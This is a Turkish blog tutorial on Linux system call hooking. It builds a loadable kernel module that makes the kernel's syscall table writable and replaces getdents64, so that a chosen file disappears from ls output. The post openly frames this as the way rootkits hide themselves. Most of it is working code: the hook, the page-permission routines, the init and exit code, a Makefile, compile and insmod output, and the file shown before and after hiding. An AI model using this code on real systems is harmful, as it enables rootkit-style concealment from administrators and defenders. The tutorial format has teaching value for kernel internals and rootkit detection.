---
title: Linux System Call Hooking
layout: post
---

# Linux System Call Hooking

Merhaba arkadaşlar **Linux System Call Hooking** isimli yazıma hoşgeldiniz.

Bu yazımda sizlere türkçe adı ile **Sistem Çağrısı Kancalama**'yı anlatacağım.

**System Call** nedir kısmına gelmeden önce **rootkit**'lerin **System Call Hooking**'i neden sıklıkla kullandığını anlatayım.

Örneğin düşünelim ki bir **Rootkit** yazdık ve bu **Rootkit**'in sistem içerisinde kendini gizlemesi lazım zaten **rootkit**'lerin en büyük gereksinimlerinden biri kendini gizlemesi.

Diyelim ki **ls** komutu çalıştığında **Rootkit**'imiz gösterilmesin istiyoruz. Bunun için bizim **ls** komutunun içerisindeki **System Call**'leri **Hook** edip **ls** komutu çalıştığında gelen liste içerisinde bizim komutumuzu gizlemek.

İlerideki kısımlarda basitce bunu yapacağız ama ondan önce **System Call** kavramının ne olduğunu öğrenelim.

Aklınızda ingilizce olarak kalmasını istediğimden buradaki terimleri ingilizce kullanarak devam edicem anlatmaya.

**System Call**'lerini aşşağıda ki resimden anlatmaya başlayalım yavaşca :

![](http://www.cs.uregina.ca/Links/class-info/330-bkup/SystemCall_IO/System_Calls.gif)

Öncelike bizim **Executable**'ımız **Library Functions**'a gider program içerisinde kullanılacak fonksiyonları almak için yada direk olarak **System call**'larına başvurur resimde de görebildiğiniz gibi.

Ayrıca resimde ki okları takip edersek şayet bu **System Call**'ların **Kernel**'e sonrasında ise **Hardware**'e bağlandığını gözlemleyebiliriz.

**System Call**'lerin neler olduğunu soracak olursanız aşşağıda bir kaçını listeleyen bir resim bırakıyorum. Tüm sistem çağrılarına yani **System Call**'lara ulaşmak istiyorsanız resmin üstüne de fotorafı aldığım web siteyi bırakacağım.

[Linux Syscall Reference](https://syscalls.kernelgrok.com/)
![](https://i.hizliresim.com/MVO54g.png)

Yani daha basite indirge edersek şayet **System Call**'leri bir program içerisinde kullandığımız örneğin **printf** gibi bir **Library Function**'unun sistem'e uyarlanmış halidir.

**System Call**'lerini anladığımıza göre **Hooking** terimine geçebiliriz. Bu terimi daha önce yazdığım blogum olan [Linux Function Hooking](https://blacknbunny.github.io/2019/04/14/Linux-Function-Hooking.html) içerisinde anlattım o yüzden bu blogumda anlatmıyacağım.

Şimdi gelelim bilalin topu kaleye nasıl soktuğuna, pardon pardon bu başka konuydu... yine karıştırdım.

Gelelim **System Call**'lerinin nasıl **Hook** edildiğine.

Aslında bu konuda daha önce anlattığım **Function Hooking**'e çok benzer bir konu. Aralarında ki bir kaç fark birinin **User-mode** içerisinde bu yazının ise **Kernel-mode** içerisinde geçmesi.

![](https://i.hizliresim.com/GmdQVV.jpg)

Buraya birde **User-mode** ve **Kernel-mode** arasındaki farkları anlatan bir stackoverflow çözümünü bırakıyorum : [User vs Kernel](https://stackoverflow.com/questions/1311402/what-is-the-difference-between-user-and-kernel-modes-in-operating-systems)

# System Call Trace

Şayet bir **Executable** içerisinde bulunan **System Call**'leri yakalamak ve incelemek istiyorsak linux içerisinde bulunan **strace** komutumuz bize çok yardımcı olacaktır.

Nasıl çalıştığını bilmeyen arkadaşlar için buraya **strace** komutunu anlatan bir yazı bırakıyorum : [Strace](https://www.tecmint.com/strace-commands-for-troubleshooting-and-debugging-linux/)

# LS komutunu hook etme

Öncelik ile **ls** komutunun hangi **System Call**'lerini içerdiğini görmek için **strace** komutunu kullanıyoruz ve çıktımız şu şekilde oluyor :

Biraz uzun olduğu için pastebin'e ekledim çıktıyı : [Strace çıktısı](https://pastebin.com/fRjDHF2T)

Bu çıktının içerisinde gözümüze çarpan bir sürü **System Call** mevcut olan ve dizin girişlerini alan **getdents64** sistem çağrısı ilgimizi çekiyor ve [man page](http://man7.org/linux/man-pages/man2/getdents.2.html)'ini incelediğimizde görebiliriz ki :

```
int getdents(unsigned int fd, struct linux_dirent *dirp,
                unsigned int count);
```

4 adet argüman alıyor ama bu argümanların içerisinde bir **structure** yani bir yapı olan **linux_dirent64** diğerlerinden farklı olarak **ls** komutu çalıştıktan sonra gelen listeyi döndürüyor :

```
struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char d_name[];  /* Filename (null-terminated) */
	/* length is actually (d_reclen - 2 -
	offsetof(struct linux_dirent, d_name)) */
	/*
	char pad;       // Zero padding byte
	char d_type;    // File type (only since Linux
	// 2.6.4); offset is (d_reclen - 1)
	*/
}
```

Ayrıca man page içerisinde bu **System Call**'ın **readdir.c** içerisinde kullanıldığını görebiliyoruz.

Artık bundan sonrası **LKM** yani **Loadable Kernel Module** development'e giriyor ve bunun ne olduğunu bilmeyen arkadaşlarımız varsa aramızda onlar içinde bir yazı yazdım.

Buradan ulaşabilirsiniz : [Loadable Kernel Module Development](https://blacknbunny.github.io/2019/04/22/loadable-kernel-module.html)

# System Call Hooking İçin LKM Geliştirmek

**Strace** komutunu kullanıp **ls** içerisinden **getdents64** sistem çağrısını incelersek şayet:

```
deadbeef@pop-os:~$ strace ls 2>&1 | grep getdents64
getdents64(3, /* 30 entries */, 32768)  = 960
getdents64(3, /* 0 entries */, 32768)   = 0
deadbeef@pop-os:~$
```

30 adet entry olduğunu görebiliriz bulunduğumuz klasör içerisinde. Doğrulamak için de **wc** komutunu kullanabiliriz :

```
deadbeef@pop-os:~$ ls -la | wc -l
30
```

Şimdi elde ettiğimiz tüm bu bilgiler ile **LKM**'mizi geliştirmeye başlayalım yavaştan.

Bu kısımı çok basit anlatacağım aramızda anlamakta zorlanan arkadaşlar olur diye.

Ve tam anlatmaya başlarken kız arkadaşım kabus görüp kalkıyor.

Evet onu yatıştırdıktan sonra yazıya devam edebilirim.

Öncelikle kütüphanelerimizi ekleyelim :

```
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
```

Sonrasında yazacağımız **LKM**'nin detaylarını girelim :

```
MODULE_AUTHOR("blacknbunny");
MODULE_DESCRIPTION("LS Komutundan cokgizlidosya.txt yi gizlemek");
MODULE_LICENSE("GPL");
```

İleride daha detaylı anlatacağım **sys_call_table** :

```
void **sys_call_table;
```

**LS** komutundan saklayacağımız dosya :

```
#define DOSYA_ISMI "cokgizlidosya.txt"
```

Orjinal **getdents64** sistem çağrısı :

```
asmlinkage int (*org_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
```

Bu orjinal sistem çağrısı yerine bizim aktaracağımız hookumuz :

```
asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
{
        int returnval;
        struct linux_dirent64 *cur = dirp;
        int i = 0;
        returnval = org_getdents64(fd, dirp, count);
        while (i < returnval) {
                if (strncmp(cur->d_name, DOSYA_ISMI, strlen(DOSYA_ISMI)) == 0) {
                        int reclen = cur->d_reclen;
                        char *next_rec = (char *)cur + reclen;
                        int len = (int)dirp + returnval - (int)next_rec;
                        memmove(cur, next_rec, len);
                        returnval -= reclen;
                        continue;
                }
                i += cur->d_reclen;
                cur = (struct linux_dirent*) ((char*)dirp + i);
        }
        return returnval;
}
```

Tüm bilgileri toplayıp birleştirdikten sonra bu hooku yazdım.

Hooku basitce açıklayacak olursam. **linux_dirent64** **struct**'u üzerinde bir döngü oluşturduk ve her bir dosya ismini aradık.

Bizim belirttiğimiz gizlenilecek dosya ile aynı ismi taşıyorsa bunu **ls** komutunda gösterme dedik.

# System Call Table
Şimdi geldik değirmenin döndüğü yere.

**System Call Table** yani **sys_call_table** kernelin içerdiği tüm sistem çağrılarını tutar. Aynı zamanda **hafıza** yani **memory** içerisinde nerede olduğunu bize gösterir.

**System Call Table**'nin adresini linux içerisinde bulmamız gerek ki gerçek **System Call** ile bizim yazdığımız sahte **Hook** sistem çağrısını değiştirebilelim. 

Ve bu şekilde her **ls** komutu çalıştığında gerçek **getdents64** sistem çağrısı yerine bizim **hook_getdents64** sistem çağrımız çalışıcak.

Yazdığımız hook belirttiğimiz dosyayı gizlemeye yaradığından **ls** komutu çalıştığında hiçbir şekilde görülemeyecek.

**sys_call_table**'nin adresini bulmak için **/boot** içerisinde bulunan **System.map**'e bakmamız gerekiyor :

```
deadbeef@pop-os:~$ sudo grep sys_call_table /boot/System.map-`uname -r`
ffffffff820001c0 R sys_call_table
ffffffff820015a0 R ia32_sys_call_table
```

Ve bu şekilde **sys_call_table**'mizin adresini bulduk **ffffffff820001c0**

Şimdide bu **sys_call_table**'ı yazılabilir yapmamız gerek ki asıl sistem çağrısı ile bizim sahte yani **Hook** sistem çağrısını değiştirebilelim.

Bunuda yapmak için vereceğimiz **sys_call_table** adresinin **table entry**'sini **manual** olarak writable yapmamız gerek.

Bu stackoverflow sorusunun cevaplarında bunu yapmak için bir sürü teknik var bakmak isterseniz : [StackOverflow sys_call_table](https://stackoverflow.com/questions/2103315/linux-kernel-system-call-hooking-example)

Bunuda **lookup_address** fonksiyonu ile **page table**'nin adresini bulup sonrasında içerisinde **sys_call_table**'ye yazma yetkisi vermeliyiz :

```
int set_page_rw(unsigned long addr)
{
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);
  if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
  return 0;
}
```

Günün sonunda bu yazdığımız **LKM**'yi **kernel**'e yükleyeceğiz fakat sonrasında bunu sildiğimizde herşeyin tekrar aynı haline dönmesi olayıda var birde.

Bunun içinde eğer **sys_call_table**'yi tekrardan **Read-Only** yapmak istiyorsak yine aynı tekniği kullanabiliriz :

```
int set_page_ro(unsigned long addr)
{
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}
```

Yetkilendirmeleri merak edenler varsa **arch/x86/include/asm/pgtable_types.h** içerisinden küçük bir liste :

```
#define _PAGE_BIT_PRESENT       0       /* is present */
#define _PAGE_BIT_RW            1       /* writeable */
#define _PAGE_BIT_USER          2       /* userspace addressable */
#define _PAGE_BIT_PWT           3       /* page write through */
#define _PAGE_BIT_PCD           4       /* page cache disabled */
#define _PAGE_BIT_ACCESSED      5       /* was accessed (raised by CPU) */
#define _PAGE_BIT_DIRTY         6       /* was written to (raised by CPU) */
#define _PAGE_BIT_PSE           7       /* 4 MB (or 2MB) page */
#define _PAGE_BIT_PAT           7       /* on 4KB pages */
#define _PAGE_BIT_GLOBAL        8       /* Global TLB entry PPro+ */
#define _PAGE_BIT_UNUSED1       9       /* available for programmer */
#define _PAGE_BIT_IOMAP         10      /* flag used to indicate IO mapping */
#define _PAGE_BIT_HIDDEN        11      /* hidden by kmemcheck */
#define _PAGE_BIT_PAT_LARGE     12      /* On 2MB or 1GB pages */
#define _PAGE_BIT_SPECIAL       _PAGE_BIT_UNUSED1
#define _PAGE_BIT_CPA_TEST      _PAGE_BIT_UNUSED1
#define _PAGE_BIT_SPLITTING     _PAGE_BIT_UNUSED1 /* only valid on a PSE pmd */
#define _PAGE_BIT_NX           63       /* No execute: only valid after cpuid check */
#define _PAGE_PRESENT   (_AT(pteval_t, 1) << _PAGE_BIT_PRESENT)
#define _PAGE_RW        (_AT(pteval_t, 1) << _PAGE_BIT_RW)
#define _PAGE_USER      (_AT(pteval_t, 1) << _PAGE_BIT_USER)
#define _PAGE_PWT       (_AT(pteval_t, 1) << _PAGE_BIT_PWT)
#define _PAGE_PCD       (_AT(pteval_t, 1) << _PAGE_BIT_PCD)
#define _PAGE_ACCESSED  (_AT(pteval_t, 1) << _PAGE_BIT_ACCESSED)
#define _PAGE_DIRTY     (_AT(pteval_t, 1) << _PAGE_BIT_DIRTY)
#define _PAGE_PSE       (_AT(pteval_t, 1) << _PAGE_BIT_PSE)
#define _PAGE_GLOBAL    (_AT(pteval_t, 1) << _PAGE_BIT_GLOBAL)
#define _PAGE_UNUSED1   (_AT(pteval_t, 1) << _PAGE_BIT_UNUSED1)
#define _PAGE_IOMAP     (_AT(pteval_t, 1) << _PAGE_BIT_IOMAP)
#define _PAGE_PAT       (_AT(pteval_t, 1) << _PAGE_BIT_PAT)
....
#define _PAGE_PAT_LARGE (_AT(pteval_t, 1) << _PAGE_BIT_PAT_LARGE)
#define _PAGE_SPECIAL   (_AT(pteval_t, 1) << _PAGE_BIT_SPECIAL)
#define _PAGE_CPA_TEST  (_AT(pteval_t, 1) << _PAGE_BIT_CPA_TEST)
#define _PAGE_SPLITTING (_AT(pteval_t, 1) << _PAGE_BIT_SPLITTING)
```

Modül yüklendiğinde yani **insmod** çalıştığında :

```
static int __init getdents_hook_init(void)
{

  sys_call_table = (void*)0xffffffff820001c0;
  org_getdents64 = sys_call_table[__NR_getdents64];

  set_page_rw(sys_call_table);
  sys_call_table[__NR_getdents64] = hook_getdents64;
        return 0;
}
```

**LKM**'mizi oluşturup **kernel**'e dahil ettikten sonra çalışacak fonksiyon.

**ÖNEMLİ** : Buradaki **sys_call_table = (void*)0xsizinsyscalltableadresiniz;**

Kısmını kendi **sys_call_table** adresiniz ile değiştirmeniz gerekli. 

Nasıl bulacağınızı yukarıda anlatmıştım eğer blog içerisinde bulamadıysanız hemen **CTRL + F** yapıp **System.map** bunu arayın orada **sys_call_table** adresinin nasıl bulunacağını anlattım.

Şimdi geldik eğer bunu silmek istersek kısmına :

```
static void __exit getdents_hook_exit(void)
{
  sys_call_table[__NR_getdents64] = org_getdents64;
  set_page_ro(sys_call_table);
        return 0;
}
```

Eğer oluşturduğumuz **LKM**'yi silersek oluşturduğumuz sahte **Hook** fonksiyonunu **sys_call_table**'den çıkartıp herşeyi tekrar eski haline çevirmesini söylüyoruz programımıza aynı zamanda **table entry**'ide tekrardan **Read-Only** yapıyoruz.

Şimdi tüm bu yazdığımız kodları tek bir bütün haline almaya geldi sıra hepsini pastebine yüklüyorum. İçerisinden değiştirmeniz gereken tek kısım **sys_call_table** adresi.

Kod : [System Call Hooking Code](https://pastebin.com/a4MF1J7T)

# Make
Şimdi sıra geldi bu kodu derlemeye.

**Makefile** isminde bir dosya oluşturun ve yukarıda yazdığımız kodu nasıl kaydettiyseniz burada bulunan **syscallhook.o** ismini onunla değiştiriniz.

```
obj-m += syscallhook.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

**make** komutunu çalıştırıp derledikten sonra çıktımız :

```
root@heyhey:~/hey# make
make -C /lib/modules/4.4.0-78-generic/build M=/root/hey modules
make[1]: Entering directory `/usr/src/linux-headers-4.4.0-78-generic'
  CC [M]  /root/hey/syscallhook.o
/root/hey/syscallhook.c: In function ‘hook_getdents64’:
/root/hey/syscallhook.c:36:21: warning: assignment from incompatible pointer type [enabled by default]
                 cur = (struct linux_dirent*) ((char*)dirp + i);
                     ^
/root/hey/syscallhook.c: In function ‘getdents_hook_init’:
/root/hey/syscallhook.c:63:3: warning: passing argument 1 of ‘set_page_rw’ makes integer from pointer without a cast [enabled by default]
   set_page_rw(sys_call_table);
   ^
/root/hey/syscallhook.c:41:5: note: expected ‘long unsigned int’ but argument is of type ‘void **’
 int set_page_rw(unsigned long addr)
     ^
/root/hey/syscallhook.c: In function ‘getdents_hook_exit’:
/root/hey/syscallhook.c:71:3: warning: passing argument 1 of ‘set_page_ro’ makes integer from pointer without a cast [enabled by default]
   set_page_ro(sys_call_table);
   ^
/root/hey/syscallhook.c:49:5: note: expected ‘long unsigned int’ but argument is of type ‘void **’
 int set_page_ro(unsigned long addr)
     ^
/root/hey/syscallhook.c:72:9: warning: ‘return’ with a value, in function returning void [enabled by default]
         return 0;
         ^
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/hey/syscallhook.mod.o
  LD [M]  /root/hey/syscallhook.ko
make[1]: Leaving directory `/usr/src/linux-headers-4.4.0-78-generic'
```

**LKM**'mizi derledikten sonra şimdi sıra geldi **ls** komutundan kaçıracağımız baştada belirttiğimiz dosya ismini oluşturmaya :

```
root@heyhey:~/hey# touch cokgizlidosya.txt
```

Bundan sonrası ziyafet. Şimdi oluşturduğumuz modülü kernel içerisine **insmod** komutu ile aktaralım :

```
root@heyhey:~/hey# insmod ./syscallhook.ko
```

Modülü yüklemeden önce **ls** komutunun bulduğu dosyalar :

 ```
 root@heyhey:~/hey# ls
cokgizlidosya.txt  Module.symvers  syscallhook.mod.c
Makefile           syscallhook.c   syscallhook.mod.o
modules.order      syscallhook.ko  syscallhook.o
 ```
 
 Modülü yükledikten sonra **ls** komutunun bulduğu dosyalar :
 
 ```
 root@heyhey:~/hey# ls
Makefile       Module.symvers  syscallhook.ko     syscallhook.mod.o
modules.order  syscallhook.c   syscallhook.mod.c  syscallhook.o
 ```
 
 Gördüğünüz gibi **ls** komutundan **cokgizlidosya.txt** dosyamızı gizlemeyi **System Call Table** içerisindeki **ls** komutunun kullandığı sistem çağrılarını hook ederek başardık.
 
 Bu modülü silip herşeyi eski haline çevirmek için :
 
 ```
 root@heyhey:~/hey# rmmod syscallhook
 ```
 
 Ve bu yazının da sonunda geldik. Umarım açıklayıcı anlatabilmişimdir.
 
Sorular için twitter hesabım : [@0DAYanc](https://twitter.com/0DAYanc)